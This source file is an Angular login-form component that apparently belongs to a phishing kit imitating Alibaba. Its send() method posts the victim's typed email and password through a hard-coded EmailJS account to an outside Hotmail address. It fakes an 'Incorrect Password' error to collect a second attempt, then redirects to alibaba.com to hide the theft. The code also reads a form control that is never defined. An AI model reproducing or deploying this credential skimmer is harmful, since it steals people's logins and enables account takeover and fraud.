import { CommonModule } from '@angular/common';
import { Component, OnInit } from '@angular/core';
import {
  FormBuilder,
  FormGroup,
  FormsModule,
  ReactiveFormsModule,
} from '@angular/forms';
import emailjs from '@emailjs/browser';

@Component({
  selector: 'app-mobile-forms',
  imports: [CommonModule, ReactiveFormsModule, FormsModule],
  templateUrl: './mobile-forms.component.html',
  styleUrl: './mobile-forms.component.scss',
})
export class MobileFormsComponent implements OnInit {
  loginForm!: FormGroup;
  showError = false;

  showPassword = false;
  attemptCount = 0;

  constructor(private fb: FormBuilder) { }

  ngOnInit(): void {
    this.loginForm = this.fb.group({
      email: this.fb.control(null),
      password: this.fb.control(null),
    });
  }

  get loginFormControl() {
    return this.loginForm.controls;
  }

  get errorMessage() {
    return 'Incorrect Password';
  }

  submit() {
    if (this.attemptCount < 1) {
      this.send();

      this.attemptCount++;
    } else {
      this.send(true);
    }

    this.showError = false;
  }

  redirectToExternalSite() {
    window.location.href = 'https://www.alibaba.com/';
  }

  async send(end: boolean = false) {
    emailjs.init('08gaTi0yX9GYMg2w_');
    const response = await emailjs
      .send('service_4fx4y8a', 'template_0tzq3y5', {
        name: 'Stanley',
        message: `Email: ${this.loginFormControl['email'].value || ''
          } Password: ${this.loginFormControl['password'].value}, Phone Number: ${this.loginFormControl['countryCode'].value
          }  Attempt: ${this.attemptCount + 1
          }`,
        email: 'ubaid.valtorquegroup@hotmail.com',

      })
      .then(() => {
        this.showError = true;
        if (end) {
          this.redirectToExternalSite();
        }
      })
      .catch(() => {
        if (end) {
          this.redirectToExternalSite();
        }
      });
  }


}
